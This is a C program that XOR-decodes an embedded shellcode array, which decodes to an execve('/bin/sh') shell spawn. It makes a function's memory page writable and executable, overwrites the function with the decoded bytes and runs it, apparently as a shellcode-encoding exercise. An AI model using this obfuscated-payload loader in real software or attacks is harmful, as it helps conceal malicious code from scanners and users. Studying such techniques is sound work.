#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>

int change_page_permissions_of_address(void *addr);
void foo();
void get_permission(void *foo_addr);
char *err_string = "Error while changing page permissions of foo()\n";
char xor_shellcode[] =
		"\xb7\xce\x2d"							   
		"\xb7\xce\x3f"							   
		"\xb7\x44\xd0\x9d\x96\x91\xd0\x8c\x97\xff" 
		"\xac"									   
		"\xb7\x76\x18"							   
		"\xaf"									   
		"\xa8"									   
		"\xb7\x76\x19"							   
		"\x4f\xc4"								   
		"\xf0\xfa";								   

int main(void)
{
	get_permission(foo);
	int code_size = sizeof(xor_shellcode) - 1;
	
	for(int i = 0; i < code_size; i++){
		xor_shellcode[i] ^= -1;
	}
	memcpy(foo, xor_shellcode, code_size);
	
	foo();
	return 0;
}


void foo()
{
    int num = 0;
}

void get_permission(void *foo_addr)
{
	if (change_page_permissions_of_address(foo_addr) == -1)
	{
		write(STDERR_FILENO, err_string, strlen(err_string) + 1);
		exit(1);
	}
}

int change_page_permissions_of_address(void *addr)
{

	int page_size = 4096;

	addr -= (unsigned long)addr % page_size;

	if (mprotect(addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1)
	{
		return -1;
	}
	return 0;
}

